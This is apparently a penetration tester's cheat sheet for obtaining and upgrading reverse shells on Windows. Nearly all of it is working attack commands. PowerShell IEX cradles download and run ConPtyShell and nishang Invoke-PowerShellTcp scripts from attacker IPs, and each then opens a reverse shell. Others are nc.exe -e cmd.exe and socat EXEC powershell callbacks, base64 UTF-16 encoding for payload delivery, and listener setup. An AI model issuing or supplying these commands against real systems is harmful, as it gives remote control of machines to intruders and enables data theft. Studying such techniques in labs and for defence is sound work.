Upgrate shell on windows
## ConPTY
```powershell
<<On linux>>
bash
stty sane
stty raw -echo; (stty size; cat) | nc -lvnp 4444 # or use 
penelope -l 4444

<<windows>>
IEX(IWR http://10.10.14.148/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.148 4443 # or
IEX(New-object net.webclient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcpOneLine.ps1') # Direct execute. or as powershell
echo IEX(New-object net.webclient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcpOneLine.ps1') | powershell -noprofile - # Direct run, - is for stdin
IEX(IWR('http://10.10.15.223/powershel.ps1'))
cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001

powershell -c IEX(New-Object NET.WebClient).DownloadString('http://10.10.14.148/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.148 -Port 4443


```

## nc.exe
```powershell
nc.exe -nv 10.10.15.223 4444 -e cmd.exe
```

## nishang
```sh
cd /nishang/Shells/  --> Invoke-PowerShellTcp.ps1
python -m simpleHTTBserver
```
```powershell

IEX(IWR http://10.10.15.223/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.223 -Port 4443




powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.15.223/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.223 -Port 4443

or for specific file location
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.223:3000/Invoke-PowerShellTcp.ps1','C:\Users\Public\Invoke-PowerShellTcp.ps1'); & 'C:\Users\Public\Invoke-PowerShellTcp.ps1'"


IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
```

## socat
Interactive shell
```sh
socat file:`tty`,raw,echo=0 TCP-L:4444
```
```powershell
socat.exe TCP:10.10.15.223:4443 EXEC:powershell.exe,pipes

socat.exe TCP4:10.10.15.223:4443 EXEC:'powershell.exe',pipes
```
